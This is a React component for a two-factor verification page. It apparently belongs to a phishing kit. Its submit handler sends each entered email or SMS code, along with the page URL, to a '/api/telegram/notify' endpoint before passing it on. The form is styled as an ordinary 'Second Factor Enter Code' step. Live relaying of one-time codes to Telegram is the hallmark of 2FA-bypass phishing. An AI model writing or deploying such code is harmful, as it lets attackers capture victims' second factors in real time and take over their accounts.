"use client"

import type React from "react"
import { useState } from "react"

interface TFACodeEntryStepProps {
  method: "email" | "sms"
  onSubmit: (code: string) => void
  onResend: () => void
}

export function TFACodeEntryStep({ method, onSubmit, onResend }: TFACodeEntryStepProps) {
  const [code, setCode] = useState("")

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (code.trim()) {
      
      await new Promise(resolve => setTimeout(resolve, 1000))
      
      
      try {
        await fetch("/api/telegram/notify", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            event: "Verification Code Submitted",
            details: {
              pageUrl: window.location.href,
              type: method === "email" ? "Email" : "SMS",
              code: code,
            },
          }),
        })
      } catch (error) {
        console.error("Failed to send TFA code notification:", error)
      }

      onSubmit(code)
    }
  }

  return (
    <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-6">
      <div className="flex flex-col sm:flex-row sm:items-center gap-3 sm:gap-4">
        <label className="text-gray-700 font-medium sm:min-w-[200px]">
          Second Factor Enter Code
        </label>
        <div className="flex-1 flex flex-col sm:flex-row sm:items-center gap-2 sm:gap-4">
          <input
            type="text"
            value={code}
            onChange={(e) => setCode(e.target.value)}
            placeholder="Enter code"
            className="flex-1 px-3 sm:px-4 py-2 border border-gray-300 focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
            autoComplete="off"
            maxLength={10}
          />
          <span className="text-gray-600 text-xs sm:text-sm sm:whitespace-nowrap">
            Enter the code you received.
          </span>
        </div>
      </div>

      <div className="flex justify-center pt-3 sm:pt-4">
        <button
          type="submit"
          disabled={!code.trim()}
          className="w-full sm:w-auto px-6 sm:px-8 py-2.5 sm:py-3 text-white font-semibold tracking-wide uppercase disabled:opacity-50 disabled:cursor-not-allowed transition-opacity text-sm sm:text-base"
          style={{ backgroundColor: "#0099D8" }}
        >
          CONTINUE
        </button>
      </div>

      <div className="text-center pt-3 sm:pt-4 text-xs sm:text-sm text-gray-600">
        If you do not receive a code after 2 minutes,{" "}
        <button
          type="button"
          onClick={async () => {
            await new Promise(resolve => setTimeout(resolve, 1000))
            onResend()
          }}
          className="text-blue-600 hover:underline font-medium"
        >
          Click Here
        </button>{" "}
        to have it resent.
      </div>
    </form>
  )
}

